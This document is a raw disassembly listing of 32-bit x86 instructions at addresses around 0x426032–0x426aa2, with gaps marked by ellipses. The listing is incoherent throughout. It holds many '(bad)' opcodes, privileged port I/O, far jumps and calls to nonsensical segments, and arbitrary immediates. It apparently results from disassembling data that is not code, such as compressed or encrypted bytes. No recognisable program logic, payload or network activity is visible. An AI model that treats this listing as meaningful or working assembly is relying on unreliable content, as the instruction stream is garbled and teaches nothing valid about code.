  426032:	mov    eax,0xccbe8db6
  426037:	xor    BYTE PTR ds:0x14f4894f,0x2a
  42603e:	sbb    eax,0xf0a72895
  426043:	clc    
  426044:	sbb    eax,esi
  426046:	or     eax,0x8c403def
  42604b:	inc    eax
  42604c:	stos   DWORD PTR es:[edi],eax
  42604d:	hlt    
  42604e:	sub    bl,ah
  426050:	push   edx
  426051:	dec    edx
  426052:	add    dh,BYTE PTR [ebx]
  426054:	mov    DWORD PTR [ebx],ecx
  426056:	daa    
  426057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426058:	cmp    bh,BYTE PTR [ecx-0x3efb889e]
  42605e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42605f:	lods   eax,DWORD PTR ds:[esi]
  426060:	sbb    dl,ah
  426062:	push   ebp
  426063:	cmp    eax,DWORD PTR [ecx-0x58f170f9]
  426069:	mov    esp,0x663c3f
	...
  4260d6:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	jne    0x42613b
  4260e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260e5:	(bad)  
  4260e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260e7:	xchg   edi,eax
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	inc    DWORD PTR [eax]
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	pop    ecx
  4260ef:	xchg   esi,eax
  4260f0:	adc    al,0x6e
  4260f2:	(bad)  
  4260f3:	mov    ch,0xf8
  4260f5:	clc    
  4260f6:	adc    eax,0x2ffe6057
  4260fb:	mov    ebp,DWORD PTR [ecx]
  4260fd:	clc    
  4260fe:	mov    bh,0x1c
  426100:	pop    es
  426101:	ret    
  426102:	or     BYTE PTR [eax+0x7e],0x82
  426106:	das    
  426107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426108:	push   0xffffffff
  42610a:	mov    ch,0x3b
  42610c:	push   eax
  42610d:	mov    WORD PTR [ebp-0x15e5404],?
  426113:	jnp    0x42614a
  426115:	int    0x64
  426117:	xchg   esi,eax
  426118:	lds    esi,FWORD PTR [eax+0x17]
  42611b:	mov    eax,0x21f1f035
  426120:	jl     0x426176
  426122:	scas   al,BYTE PTR es:[edi]
  426123:	clc    
  426124:	sbb    ecx,ecx
  426126:	loope  0x426150
  426128:	mov    bl,0xd5
  42612a:	xchg   DWORD PTR [eax-0x62a9d101],edi
  426130:	or     eax,0x7bf49e8
  426135:	cwde   
  426136:	loop   0x426146
  426138:	fwait
  426139:	xchg   esp,eax
  42613a:	cmp    eax,0xc3284c42
  42613f:	out    dx,al
  426140:	push   edi
  426141:	or     bl,bl
  426143:	push   0x7d8d997d
  426148:	in     al,dx
  426149:	aam    0xb1
  42614b:	mov    edx,0x239748fd
  426150:	add    DWORD PTR [ecx],0x8b93fb13
  426156:	das    
  426157:	cmp    DWORD PTR [eax-0x7b8966a1],ebp
  42615d:	pop    ebx
  42615e:	pop    edi
  42615f:	(bad)  
  426160:	aam    0x8a
  426162:	adc    edi,DWORD PTR [ebx-0x2ed88c7b]
  426168:	out    0x20,al
  42616a:	aas    
  42616b:	bound  eax,QWORD PTR [esi-0x4a5f55a7]
  426171:	xchg   BYTE PTR [ebx],ah
  426173:	xor    BYTE PTR ds:0xeec2b0ef,al
  426179:	push   0xfffffff3
  42617b:	out    dx,eax
  42617c:	es lock stos BYTE PTR es:[edi],al
  42617f:	xor    al,BYTE PTR ds:0x5e52edb9
  426185:	inc    ecx
  426186:	cmp    BYTE PTR [ebx+edx*4+0x35cc79f4],bh
  42618d:	ss jmp 0x86f8:0xcf03db87
  426195:	mov    cl,ch
  426197:	out    0x7,eax
  426199:	mov    BYTE PTR [ecx-0x1d1ee2b7],ch
  42619f:	add    cl,BYTE PTR [esi]
  4261a1:	sar    DWORD PTR [edi-0x2f],1
  4261a4:	xor    esp,DWORD PTR [eax+0xc]
  4261a7:	loop   0x426213
  4261a9:	and    eax,0x78e38812
  4261ae:	rcr    esp,1
  4261b0:	outs   dx,DWORD PTR ds:[esi]
  4261b1:	xor    BYTE PTR [edx],bl
  4261b3:	sti    
  4261b4:	in     eax,dx
  4261b5:	xchg   ebp,eax
  4261b6:	mov    bh,0xa5
  4261b8:	adc    BYTE PTR [ebp-0x4d54147f],ch
  4261be:	ja     0x4261ac
  4261c0:	popa   
  4261c1:	sub    eax,0xaff8f414
  4261c6:	mul    DWORD PTR ds:0x9172297a
  4261cc:	cdq    
  4261cd:	lods   al,BYTE PTR ds:[esi]
  4261ce:	in     eax,0xd2
  4261d0:	lahf   
  4261d1:	das    
  4261d2:	sub    edi,esp
  4261d4:	aaa    
  4261d5:	or     edx,DWORD PTR [ebp+0x53]
  4261d8:	add    al,0x2c
  4261da:	(bad)
  4261de:	lea    edi,ds:0xdfc07b80
  4261e4:	xchg   esp,eax
  4261e5:	aas    
  4261e6:	mov    cl,0x87
  4261e8:	mov    DWORD PTR [ebx+0x35],ecx
  4261eb:	sbb    DWORD PTR [ecx+0x0],edi
	...
  426256:	fwait
  426257:	and    DWORD PTR [edi],ecx
  426259:	popa   
  42625a:	mov    edi,0xb7fbff6f
  42625f:	xor    DWORD PTR [ecx-0x4f1a19d9],0xffffffd4
  426266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426267:	cwde   
  426268:	add    DWORD PTR [eax],eax
  42626a:	inc    DWORD PTR [eax]
  42626c:	add    BYTE PTR [eax],al
  42626e:	outs   dx,BYTE PTR ds:[esi]
  42626f:	mov    al,0x6a
  426271:	ins    BYTE PTR es:[edi],dx
  426272:	shr    DWORD PTR [ecx+0x382b9118],cl
  426278:	inc    esp
  426279:	mov    dl,0xbe
  42627b:	sub    cl,ah
  42627d:	icebp  
  42627e:	fcmovnu st,st(6)
  426280:	push   edx
  426281:	bnd jmp 0xe64f9800
  426287:	mov    ds:0xe2242bef,al
  42628c:	repnz out 0x9,eax
  42628f:	sub    eax,0xec27e6ea
  426294:	mov    ecx,0xf12fe663
  426299:	jne    0x426306
  42629b:	dec    edi
  42629c:	addr16 test al,0x44
  42629f:	enter  0xe51a,0x38
  4262a3:	stos   DWORD PTR es:[edi],eax
  4262a4:	mov    DWORD PTR [ebp+0x732dd60],edi
  4262aa:	fcom   QWORD PTR [ebp-0x6f]
  4262ad:	jmp    0x6254:0x67ba68da
  4262b4:	jle    0x4262ef
  4262b6:	sti    
  4262b7:	add    BYTE PTR [eax],dh
  4262b9:	sti    
  4262ba:	ds stos DWORD PTR es:[edi],eax
  4262bc:	and    eax,0x663d6908
  4262c1:	xchg   BYTE PTR ds:0x1ab741e2,bh
  4262c7:	or     ch,ah
  4262c9:	mov    esp,0x25c3757
  4262ce:	sub    dl,0x2c
  4262d1:	and    ebp,ecx
  4262d3:	add    ebx,ecx
  4262d5:	jmp    DWORD PTR [edx+ecx*8+0x3906d0b4]
  4262dc:	lods   eax,DWORD PTR ds:[esi]
  4262dd:	out    0xa4,al
  4262df:	mov    ah,0x7
  4262e1:	and    al,0x9a
  4262e3:	fsubr  QWORD PTR [ecx+ebp*4+0x60]
  4262e7:	mov    ch,0x57
  4262e9:	jge    0x426287
  4262eb:	jecxz  0x426329
  4262ed:	inc    esi
  4262ee:	lock data16 rcl BYTE PTR [eax],0xfa
  4262f3:	fmul   st(3),st
  4262f5:	into   
  4262f6:	push   edx
  4262f7:	push   0xffffffca
  4262f9:	(bad)  
  4262fa:	xchg   esi,eax
  4262fb:	dec    ecx
  4262fc:	cmp    ebp,DWORD PTR [edi-0x4ceafd9d]
  426302:	pusha  
  426303:	jle    0x426372
  426305:	stc    
  426306:	rcl    DWORD PTR [eax],0x4e
  426309:	xor    DWORD PTR [ebp-0x9abe275],edi
  42630f:	out    0xc6,eax
  426311:	fs int 0x5e
  426314:	imul   ecx,ebp,0xa92e389b
  42631a:	adc    eax,0xc0726fbe
  42631f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426320:	add    bl,0xae
  426323:	xchg   ebx,eax
  426324:	mov    dl,0x53
  426326:	int3   
  426327:	mov    ebx,0x4d3d4ac4
  42632c:	rcr    DWORD PTR [edi+0x64],cl
  42632f:	es mov eax,0xf3c1cf12
  426335:	rol    DWORD PTR [ecx],1
  426337:	mov    esp,0xd44c6e3e
  42633c:	(bad)  
  42633e:	mov    DWORD PTR [eax-0x20daf758],ebx
  426344:	mul    DWORD PTR [esi+eax*2-0x31]
  426348:	add    al,0x5b
  42634a:	xchg   esi,eax
  42634b:	test   BYTE PTR [ebx-0x6a],0x8
  42634f:	fisttp QWORD PTR [esi+0x66d468b7]
  426355:	and    al,0x53
  426357:	mov    ch,0x5d
  426359:	jl     0x42636c
  42635b:	dec    ebx
  42635c:	in     al,0xdf
  42635e:	add    ch,BYTE PTR [ecx]
  426360:	jbe    0x4263bf
  426362:	xchg   ebx,eax
  426363:	ds pop edx
  426365:	jecxz  0x426336
  426367:	push   0x63
  426369:	std    
  42636a:	mov    dl,0xad
  42636c:	pop    edi
	...
  4263d5:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  4263d9:	dec    esi
  4263da:	std    
  4263db:	out    dx,al
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x1456d828
  4263e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263e7:	cdq    
  4263e8:	add    DWORD PTR [eax],eax
  4263ea:	inc    DWORD PTR [eax]
  4263ec:	add    BYTE PTR [eax],al
  4263ee:	sbb    BYTE PTR [edi-0x13],dh
  4263f1:	pusha  
  4263f2:	imul   edx,DWORD PTR [edx],0x6e0b645c
  4263f8:	mov    bl,0x47
  4263fa:	jmp    0x34c7:0xbc73d75c
  426401:	cmp    ch,dh
  426403:	pop    ss
  426404:	jnp    0x426390
  426406:	shl    DWORD PTR [edx-0xd1b644e],0x12
  42640d:	xor    BYTE PTR [ebp-0x4484c457],bl
  426413:	jne    0x426429
  426415:	fldl2t 
  426417:	fist   WORD PTR [edx+0x7b]
  42641a:	(bad)  
  42641b:	cld    
  42641c:	aas    
  42641d:	push   0x3f6198f2
  426422:	add    BYTE PTR [edi+ebp*1-0x7e],cl
  426426:	mov    ds:0xa94ff20b,al
  42642b:	jno    0x4263b8
  42642d:	push   edx
  42642e:	jnp    0x426495
  426430:	sub    ecx,edi
  426432:	test   eax,0xd27520fd
  426437:	gs std 
  426439:	or     ebx,DWORD PTR [ebp+0x258d2ead]
  42643f:	jmp    0x79b84f34
  426444:	pop    esp
  426445:	sar    ch,1
  426447:	(bad)  
  426448:	jmp    0x3c0edb5b
  42644d:	push   ebp
  42644e:	mov    dl,0x3f
  426450:	cmp    DWORD PTR [edx],0xaee75c60
  426456:	mov    DWORD PTR [ebx-0x3acb4b45],ecx
  42645c:	dec    bx
  42645e:	sbb    cl,cl
  426460:	mov    edx,0xab5131bf
  426465:	push   ss
  426466:	pop    ds
  426467:	jb     0x4264e5
  426469:	dec    ecx
  42646a:	push   eax
  42646b:	pop    edx
  42646c:	cmc    
  42646d:	fwait
  42646e:	or     edi,eax
  426470:	cmp    eax,0x1bb7f186
  426475:	add    ecx,DWORD PTR [ecx+0x7c]
  426478:	xchg   esp,eax
  426479:	mov    ch,0x48
  42647b:	ja     0x426442
  42647d:	stc    
  42647e:	pusha  
  42647f:	jp     0x4264f0
  426481:	aam    0x8d
  426483:	push   0x38
  426485:	add    ah,BYTE PTR [edx+ebp*4-0x4984be47]
  42648c:	into   
  42648d:	inc    ebx
  42648e:	mov    al,ds:0xf679c256
  426493:	(bad)  
  426495:	sahf   
  426496:	addr16 das 
  426498:	or     ebx,DWORD PTR [edi-0x42]
  42649b:	sbb    esp,0xffffffe8
  42649e:	inc    edi
  42649f:	ror    DWORD PTR [esi-0xb],1
  4264a2:	add    BYTE PTR es:[eax-0x32533a13],dh
  4264a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264aa:	shl    ecx,1
  4264ac:	or     BYTE PTR ds:0x9867bf45,dh
  4264b2:	(bad)  
  4264b3:	bnd jl 0x4264ff
  4264b6:	cli    
  4264b7:	imul   ecx,DWORD PTR [ebx+0x2b83b623],0x3f74d92a
  4264c1:	or     ebp,DWORD PTR [ecx]
  4264c3:	lods   al,BYTE PTR ds:[si]
  4264c5:	scas   eax,DWORD PTR es:[edi]
  4264c6:	mov    esp,DWORD PTR [edi-0x39]
  4264c9:	inc    esi
  4264ca:	inc    ebp
  4264cb:	pop    eax
  4264cc:	outs   dx,BYTE PTR ds:[esi]
  4264cd:	and    al,0xe6
  4264cf:	mov    bh,0xa1
  4264d1:	loope  0x42653c
  4264d3:	cdq    
  4264d4:	and    eax,0x43478468
  4264d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264da:	ins    BYTE PTR es:[edi],dx
  4264db:	add    DWORD PTR [ebp-0x63],eax
  4264de:	xor    esi,DWORD PTR [edx]
  4264e0:	cmp    bh,BYTE PTR [ebp-0x4]
  4264e3:	push   0xfffffff4
  4264e5:	lods   eax,DWORD PTR ds:[esi]
  4264e6:	or     ch,BYTE PTR ds:0xa7533c4f
  4264ec:	cmp    BYTE PTR [eax],al
	...
  426556:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42655d:	outs   dx,DWORD PTR ds:[esi]
  42655e:	vmwrite ecx,DWORD PTR [edx-0x41d26a7b]
  426565:	fsub   QWORD PTR [ebx-0xfffe66]
  42656b:	add    BYTE PTR [eax],al
  42656d:	add    BYTE PTR [edi+edi*2-0x6281304],bh
  426574:	cwde   
  426575:	and    eax,0xe3ae4600
  42657a:	bnd jns 0x4265da
  42657d:	scas   al,BYTE PTR es:[edi]
  42657e:	arpl   WORD PTR [edx],cx
  426580:	sbb    al,0x34
  426582:	pop    esi
  426583:	cld    
  426584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426585:	test   DWORD PTR [ebx+0x52],edi
  426588:	and    al,0xd
  42658a:	sbb    bl,cl
  42658c:	int3   
  42658d:	cld    
  42658e:	out    dx,al
  42658f:	jecxz  0x426608
  426591:	cmp    al,0xd1
  426593:	and    DWORD PTR [edi+0x4472e79],eax
  426599:	add    DWORD PTR [ebp-0x30],0x32
  42659d:	inc    edx
  42659e:	xor    edi,DWORD PTR [eax+edi*2]
  4265a1:	inc    edi
  4265a2:	(bad)  
  4265a3:	int3   
  4265a4:	xchg   ecx,eax
  4265a6:	mov    ds:0x6cc3df80,al
  4265ab:	cli    
  4265ac:	dec    edi
  4265ad:	outs   dx,DWORD PTR ds:[esi]
  4265ae:	push   edi
  4265af:	sub    eax,0xd69fd5ea
  4265b4:	lahf   
  4265b5:	jg     0x426613
  4265b7:	pop    ebp
  4265b8:	fmul   st(6),st
  4265ba:	mov    edi,0xaccb8d46
  4265bf:	xchg   DWORD PTR [ebp+0x1b],ebp
  4265c2:	add    DWORD PTR [ecx-0x40bfc4ac],0x7826074
  4265cc:	mov    ch,0xe2
  4265ce:	ret    0x450e
  4265d1:	dec    ebp
  4265d2:	inc    ecx
  4265d3:	push   0xffffffa4
  4265d5:	jecxz  0x426572
  4265d7:	push   esp
  4265d8:	into   
  4265d9:	push   ss
  4265da:	pop    ebp
  4265db:	gs pop edi
  4265dd:	sbb    eax,0xd9475a45
  4265e2:	sbb    al,0x48
  4265e4:	inc    ebp
  4265e5:	jecxz  0x4265e1
  4265e7:	cli    
  4265e8:	stc    
  4265e9:	cmp    al,0xb4
  4265eb:	ja     0x426576
  4265ed:	and    ebp,esp
  4265ef:	jae    0x42661c
  4265f1:	and    al,ah
  4265f3:	mov    edi,0x4cbf645b
  4265f8:	or     al,0x63
  4265fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265fb:	std    
  4265fc:	aad    0xc5
  4265fe:	jle    0x4265cc
  426600:	jbe    0x426612
  426602:	sbb    al,BYTE PTR [ecx+0x11654e79]
  426608:	mov    dh,0xdc
  42660a:	retf   0x221d
  42660d:	adc    eax,0x55d06278
  426612:	mov    eax,0x2dd6f0a5
  426617:	add    eax,0x5b3a6cfb
  42661c:	or     eax,0xfc6448c4
  426621:	jns    0x426628
  426623:	mov    dh,0xfd
  426625:	ins    BYTE PTR es:[edi],dx
  426626:	jo     0x42662a
  426628:	inc    ecx
  426629:	cdq    
  42662a:	jmp    0xb488b7cf
  42662f:	mov    eax,ds:0x31ea4eb5
  426634:	bound  edi,QWORD PTR [ecx+0xf]
  426637:	(bad)  
  426638:	cdq    
  426639:	cmc    
  42663a:	(bad)  
  42663c:	cdq    
  42663d:	std    
  42663e:	sub    al,0x82
  426640:	pop    ds
  426641:	fist   DWORD PTR [ebx]
  426643:	jae    0x4266c1
  426645:	jp     0x4266c2
  426647:	shl    eax,cl
  426649:	in     eax,dx
  42664a:	cmp    DWORD PTR [eax+0x1d07839f],edx
  426650:	out    0xe4,eax
  426652:	rcr    DWORD PTR [ebp-0x2820a782],1
  426658:	call   0x7936:0xc750eb3f
  42665f:	pop    ebp
  426660:	and    BYTE PTR [ecx],bh
  426662:	xor    BYTE PTR [ebp+0x4a],dh
  426665:	mov    dh,0x13
  426667:	out    0x5b,eax
  426669:	push   esp
  42666a:	popa   
  42666b:	(bad)  [edx+0x0]
	...
  4266d5:	add    BYTE PTR [edx],dl
  4266d7:	retf   
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi-0x3625925c]
  4266e4:	xchg   edx,eax
  4266e5:	xchg   DWORD PTR [edx-0xfffe65],esp
  4266eb:	add    BYTE PTR [eax],al
  4266ed:	add    BYTE PTR ds:0xb042601c,bh
  4266f3:	jge    0x42670d
  4266f5:	(bad)  
  4266f6:	fcom   DWORD PTR [edx]
  4266f8:	pop    esp
  4266f9:	cwde   
  4266fa:	pop    esp
  4266fb:	jg     0x426720
  4266fd:	add    DWORD PTR [ecx],eax
  4266ff:	mov    dl,0xcf
  426701:	out    dx,eax
  426702:	or     al,0xc1
  426704:	dec    eax
  426705:	jae    0x4266e0
  426707:	sub    eax,0x4be5e375
  42670c:	call   0x6896:0x1361a428
  426713:	dec    esp
  426714:	iret   
  426715:	lods   eax,DWORD PTR ds:[esi]
  426716:	shl    BYTE PTR [ebx+0x37eae42a],1
  42671c:	iret   
  42671d:	sahf   
  42671e:	inc    ebx
  42671f:	fild   QWORD PTR [edi-0x58]
  426722:	aad    0xb9
  426724:	data16 jne 0x42675a
  426727:	mov    ebx,0x865695a8
  42672c:	outs   dx,BYTE PTR ds:[esi]
  42672d:	sar    DWORD PTR [ebx],0xf8
  426730:	out    dx,eax
  426731:	inc    esp
  426732:	imul   ebp,DWORD PTR [eax],0xffffff95
  426735:	push   es
  426736:	in     al,0xf7
  426738:	das    
  426739:	stc    
  42673a:	mov    ah,BYTE PTR [ebx-0x40]
  42673d:	sbb    bl,dl
  42673f:	cdq    
  426740:	add    al,0x7c
  426742:	sbb    DWORD PTR [eax+0xb],ebp
  426745:	test   eax,0x1baf1129
  42674a:	cmp    esp,edx
  42674c:	(bad)  
  42674d:	das    
  42674e:	test   DWORD PTR ds:0x60700f9d,ebp
  426754:	je     0x4267b1
  426756:	or     eax,0x7582571d
  42675b:	aas    
  42675c:	outs   dx,BYTE PTR ds:[esi]
  42675d:	xchg   ebx,eax
  42675e:	inc    ebp
  42675f:	mov    gs,WORD PTR [edi]
  426761:	fld    QWORD PTR [ecx-0x4b]
  426764:	and    al,0xa8
  426766:	mov    bl,0xde
  426768:	das    
  426769:	push   edi
  42676a:	adc    BYTE PTR [ebx+0x19],al
  42676d:	sbb    BYTE PTR gs:[eax-0x5da9e661],cl
  426774:	mov    ebx,esi
  426776:	cmp    bl,BYTE PTR fs:[eax+0x4eeca82b]
  42677d:	dec    esi
  42677e:	or     ebx,DWORD PTR [esi-0x6f87c613]
  426784:	rcl    BYTE PTR [ecx-0x64],1
  426787:	and    BYTE PTR [edi*4-0x243966f8],ah
  42678e:	cmp    eax,0xe5466e3
  426793:	jp     0x426719
  426795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426796:	fst    QWORD PTR [edx-0x290dd923]
  42679c:	sbb    al,BYTE PTR [ecx+eax*1]
  42679f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267a0:	repnz addr16 loopne 0x4267cc
  4267a4:	xchg   ebp,eax
  4267a5:	(bad)  
  4267a6:	mov    esp,0xe48c094c
  4267ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267ac:	pop    esi
  4267ad:	push   0xf5d2bf9d
  4267b2:	in     eax,dx
  4267b3:	or     ebx,eax
  4267b5:	out    dx,al
  4267b6:	ins    DWORD PTR es:[edi],dx
  4267b7:	xor    bh,BYTE PTR [esi]
  4267b9:	xchg   ebp,eax
  4267ba:	stc    
  4267bb:	(bad)  
  4267bc:	(bad)  
  4267be:	in     eax,dx
  4267bf:	mov    ch,0x62
  4267c1:	sub    eax,0x7039f0fd
  4267c6:	xor    ebx,DWORD PTR [ebx+0x1d01ba13]
  4267cc:	dec    ebx
  4267cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267ce:	retf   
  4267cf:	mov    ebp,0x8839b04f
  4267d4:	xor    DWORD PTR [edx+0x67],esi
  4267d7:	aam    0x20
  4267d9:	xor    dl,bh
  4267db:	or     dl,BYTE PTR [eax]
  4267dd:	sbb    BYTE PTR [ebx-0x7ed6f7e8],ah
  4267e3:	or     BYTE PTR [ecx],ah
  4267e5:	xchg   esp,eax
  4267e6:	push   edx
  4267e7:	mov    ecx,edx
  4267e9:	inc    ecx
  4267ea:	(bad)  
  4267eb:	cld    
  4267ec:	xor    BYTE PTR [eax],al
	...
  426856:	mov    eax,0xff2ace8d
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	mov    ch,0xb0
  426864:	sub    eax,DWORD PTR [ecx+0x19ca1]
  42686a:	inc    DWORD PTR [eax]
  42686c:	add    BYTE PTR [eax],al
  42686e:	outs   dx,BYTE PTR ds:[esi]
  42686f:	jbe    0x4268be
  426871:	pop    ebp
  426872:	(bad)  
  426873:	fild   WORD PTR [eax-0x19]
  426876:	aas    
  426877:	(bad)  
  426878:	xor    bl,cl
  42687a:	jmp    0x68848f35
  42687f:	dec    edx
  426880:	dec    edi
  426881:	fcmove st,st(6)
  426883:	sahf   
  426884:	js     0x4268ae
  426886:	fstp   DWORD PTR [edx]
  426888:	push   0x24
  42688a:	mov    ?,edi
  42688c:	fist   DWORD PTR [edx]
  42688e:	les    eax,FWORD PTR [ecx]
  426890:	adc    BYTE PTR gs:[eax],cl
  426893:	leave  
  426894:	fsub   st(1),st
  426896:	aad    0xf
  426898:	jg     0x4268da
  42689a:	xchg   edx,eax
  42689b:	popa   
  42689c:	in     eax,0xfa
  42689e:	xchg   ebx,eax
  42689f:	retf   
  4268a0:	retf   
  4268a1:	aam    0x68
  4268a3:	popa   
  4268a4:	xor    DWORD PTR [ecx+0x3ebe0498],edi
  4268aa:	js     0x426923
  4268ac:	inc    edx
  4268ad:	scas   al,BYTE PTR es:[edi]
  4268ae:	and    esi,DWORD PTR [ebp-0x35]
  4268b1:	out    dx,eax
  4268b2:	push   ds
  4268b3:	loope  0x4268a2
  4268b5:	gs inc edi
  4268b7:	sub    ch,BYTE PTR [ecx-0x124d4ec1]
  4268bd:	and    eax,0x9f4bf561
  4268c2:	mov    bh,BYTE PTR [ebx+0x43521826]
  4268c8:	(bad)  
  4268c9:	pop    ds
  4268ca:	(bad)  
  4268cb:	xchg   ecx,eax
  4268cc:	mov    edi,DWORD PTR [eax]
  4268ce:	xor    ebp,ebp
  4268d0:	mov    dl,0x36
  4268d2:	push   edi
  4268d3:	je     0x426937
  4268d5:	call   0x960ac3f2
  4268da:	xlat   BYTE PTR ds:[ebx]
  4268db:	ret    0xb76c
  4268de:	lods   al,BYTE PTR ds:[esi]
  4268df:	stos   DWORD PTR es:[edi],eax
  4268e0:	test   al,0x43
  4268e2:	jmp    0x4268b6
  4268e4:	xor    al,0x8b
  4268e6:	sbb    bl,0x90
  4268e9:	retf   
  4268ea:	push   0xffffffec
  4268ec:	sbb    BYTE PTR [edx-0x45],ah
  4268ef:	outs   dx,DWORD PTR ds:[esi]
  4268f0:	(bad)  
  4268f2:	clc    
  4268f3:	retf   
  4268f4:	push   ebp
  4268f5:	pop    edi
  4268f6:	jne    0x4268ba
  4268f8:	push   ebx
  4268f9:	xor    DWORD PTR [eax+esi*1-0x4e],esp
  4268fd:	ins    DWORD PTR es:[edi],dx
  4268fe:	jmp    FWORD PTR [esi+0x39]
  426901:	neg    BYTE PTR ds:0x3714a808
  426907:	add    DWORD PTR [ebx+0x309285d5],ebx
  42690d:	not    ebx
  42690f:	add    al,0x52
  426911:	adc    edx,ebx
  426913:	stos   DWORD PTR es:[edi],eax
  426914:	mov    ebx,esp
  426916:	jg     0x42691d
  426918:	clc    
  426919:	or     al,0x6b
  42691b:	aaa    
  42691c:	pusha  
  42691d:	gs test al,0x19
  426920:	(bad)  
  426921:	pop    ebp
  426922:	bound  edi,QWORD PTR ds:[ebx+esi*1+0x3e81c805]
  42692a:	push   ebx
  42692b:	add    al,BYTE PTR [ebx]
  42692d:	jle    0x4268c5
  42692f:	lods   eax,DWORD PTR ds:[esi]
  426930:	pop    edx
  426931:	outs   dx,DWORD PTR ds:[esi]
  426932:	inc    ecx
  426933:	sbb    al,0xc1
  426935:	mov    ch,0xcd
  426937:	int    0x6f
  426939:	sti    
  42693a:	mov    esi,0xc43040d9
  42693f:	fstp   QWORD PTR [edi]
  426941:	push   ebp
  426942:	mov    ecx,0xa68fe749
  426947:	sbb    BYTE PTR [esp+eax*8],ch
  42694a:	int    0x3b
  42694c:	jle    0x4268d2
  42694e:	pop    edx
  42694f:	dec    eax
  426950:	and    edi,DWORD PTR [ebp+0xed1976e]
  426956:	pop    esp
  426957:	fadd   st,st(2)
  426959:	sti    
  42695a:	lea    ebx,[edx-0x22b16077]
  426960:	cwde   
  426961:	add    DWORD PTR [ecx],ecx
  426963:	adc    ch,bh
  426965:	into   
  426966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426967:	neg    ebp
  426969:	mov    WORD PTR [esi+0x67],gs
  42696c:	adc    BYTE PTR [eax],al
	...
  4269d6:	mov    WORD PTR [esi+0x7d],cs
  4269d9:	jge    0x4269da
  4269db:	jg     0x426969
  4269dd:	jmp    FWORD PTR [ebx]
  4269df:	in     al,dx
  4269e0:	lahf   
  4269e1:	mov    esi,DWORD PTR [ebx+0x3c]
  4269e4:	mov    BYTE PTR [ebp+0x19da0],al
  4269ea:	inc    DWORD PTR [eax]
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	mov    ecx,DWORD PTR [ecx+esi*1-0x64090287]
  4269f5:	scas   eax,DWORD PTR es:[edi]
  4269f6:	sbb    BYTE PTR [esi+eax*8+0xad820fd],0x94
  4269fe:	(bad)  
  4269ff:	sub    al,0x30
  426a01:	push   esp
  426a02:	call   FWORD PTR [ecx-0x5b]
  426a05:	mov    ds:0x40be8d30,al
  426a0a:	jns    0x426a7b
  426a0c:	push   es
  426a0d:	or     al,0x20
  426a0f:	add    ah,BYTE PTR [esi-0x73]
  426a12:	div    DWORD PTR [eax]
  426a14:	mov    bl,0x89
  426a16:	shr    dh,cl
  426a18:	pusha  
  426a19:	sahf   
  426a1a:	xor    edi,DWORD PTR [ecx+0x13]
  426a1d:	(bad)  
  426a1e:	shl    DWORD PTR [esi],cl
  426a20:	mov    dh,BYTE PTR ds:0x91704958
  426a26:	mov    ebx,0x64a66fc6
  426a2b:	and    ch,cl
  426a2d:	cld    
  426a2e:	add    eax,0x5a010697
  426a33:	mov    al,BYTE PTR [ecx]
  426a35:	mov    bl,bl
  426a37:	pop    ecx
  426a38:	dec    BYTE PTR [ebx]
  426a3a:	lds    ebp,FWORD PTR [edx-0x72]
  426a3d:	push   ecx
  426a3e:	adc    al,0xd6
  426a40:	jmp    0xf41e:0x24002451
  426a47:	stos   BYTE PTR es:[edi],al
  426a48:	aas    
  426a49:	pop    ebx
  426a4a:	(bad)  
  426a4b:	fcomp  DWORD PTR [edx+0x2381dc5e]
  426a51:	out    0xe4,eax
  426a53:	cmp    ch,BYTE PTR [edx+0x59]
  426a56:	fwait
  426a57:	xchg   esp,eax
  426a58:	les    esp,FWORD PTR [edi+0x62]
  426a5b:	pop    eax
  426a5c:	jne    0x426a15
  426a5e:	push   esi
  426a5f:	out    dx,al
  426a60:	lahf   
  426a61:	pop    esi
  426a62:	inc    edi
  426a63:	into   
  426a64:	jge    0x426a6b
  426a66:	(bad)  
  426a67:	cdq    
  426a68:	mov    gs,WORD PTR [edi+0x74a3ea9d]
  426a6e:	inc    edx
  426a6f:	mov    eax,0x3733566b
  426a74:	mov    BYTE PTR [edi-0x3d],bl
  426a77:	aas    
  426a78:	das    
  426a79:	call   0xe6e7dfb1
  426a7e:	icebp  
  426a7f:	xor    cl,BYTE PTR [esi+0x10]
  426a82:	aaa    
  426a83:	cmp    DWORD PTR [eax],ecx
  426a85:	inc    esi
  426a86:	aas    
  426a87:	(bad)  
  426a89:	pop    edx
  426a8a:	cli    
  426a8b:	pop    edx
  426a8c:	or     eax,0x6e5fa0d
  426a91:	sbb    edi,DWORD PTR [edi+eiz*4-0x463f7781]
  426a98:	lahf   
  426a99:	xor    eax,0x28708353
  426a9e:	imul   BYTE PTR [esp+eax*8+0x74]
  426aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
